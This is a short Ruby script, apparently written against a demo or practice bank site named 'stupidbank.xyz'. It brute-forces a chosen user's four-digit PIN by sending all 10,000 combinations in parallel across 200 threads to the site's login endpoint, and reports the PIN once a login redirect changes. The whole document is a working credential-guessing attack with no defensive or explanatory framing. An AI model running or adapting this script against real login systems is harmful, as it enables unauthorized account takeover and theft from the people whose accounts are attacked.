require 'net/http'

THREADS = 200
SESSIONS_URI = URI.parse('https://stupidbank.xyz/sessions')
ALL_PINS = '0000'..'9999'

def brute_force_pins(pin_range, user_id)
  Net::HTTP.start(SESSIONS_URI.host, SESSIONS_URI.port, use_ssl: true) do |http|
    pin_range.each do |pin|
      request = Net::HTTP::Post.new(SESSIONS_URI.request_uri)
      request.set_form_data(id: user_id, pin: pin)

      response = http.request(request)

      puts "#{pin}: #{response.header['Location']}"

      if response.header['Location'] != 'https://stupidbank.xyz/'
        puts "PIN FOUND: #{pin}"
        exit 0
      end
    end
  end
end

def start
  user_id = ARGV[0] or raise 'specify user id'

  threads = ALL_PINS.each_slice(ALL_PINS.to_a.length / THREADS).map do |pin_range|
    Thread.new { brute_force_pins(pin_range, user_id) }
  end

  threads.each(&:join)
end

start
